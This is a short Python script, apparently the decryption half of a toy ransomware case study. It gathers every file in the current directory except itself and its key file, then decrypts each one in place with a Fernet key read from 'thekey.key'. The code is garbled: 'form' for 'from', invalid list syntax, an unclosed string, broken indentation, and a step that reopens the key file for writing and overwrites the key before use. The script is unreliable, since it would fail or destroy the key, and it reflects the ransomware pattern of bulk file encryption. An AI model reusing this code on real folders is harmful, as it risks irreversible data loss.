import os 
form cryptography.fernet import Fernet

files[]

for file in os.listdir():
     if file == "casestudy.py" or file == "thekey.key" or file =="decrypt.py:
           continue
      if os.path.isfile(file):
            files.append(file)
 print(files)

with open("thekey.key","rb") as key:
   secretkey  = key.read()
 
with open("thekey.key","wb") as thekey:
     thekey.write(key)
    
    
for file in files:
     with open(file,"rb") as thefile:
            contents = thefile.read()
      contents_decrypted = Fernet(secretkey).decrypt(contents)
      with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
      
